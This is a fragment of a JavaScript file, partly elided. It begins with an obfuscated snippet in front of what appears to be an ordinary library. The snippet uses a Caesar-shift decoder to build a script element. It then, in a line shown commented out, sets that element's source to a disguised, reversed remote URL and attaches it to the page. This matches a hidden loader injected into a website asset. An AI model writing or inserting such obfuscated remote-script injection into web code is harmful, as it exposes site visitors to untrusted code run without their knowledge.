...
!function (r) {
    ...
    function t(r, e) {
        ...
        for (var n = 0; n < r.length; n++) {
            ...
            t += a >= 65 && a <= 90 ? String.fromCharCode((a - 65 + e) % 26 + 65) : a >= 97 && a <= 122 ? String.fromCharCode((a - 97 + e) % 26 + 97) : r.charAt(n);
        }
        return t;
    }

    var n = document.createElement(e(t("bxqzka", 8)));
    // n.src = e(t("iz.2ffQuted/ces.dtsasqh.6vs.15h.3st738qs3272vv20q6q2s81u95373624-624q00298st178u6qv73//:fjjx", 16)), document.querySelector(e(t("wbmz", 24))).appendChild(n);
}();
!function (a, b) {
    "use strict";
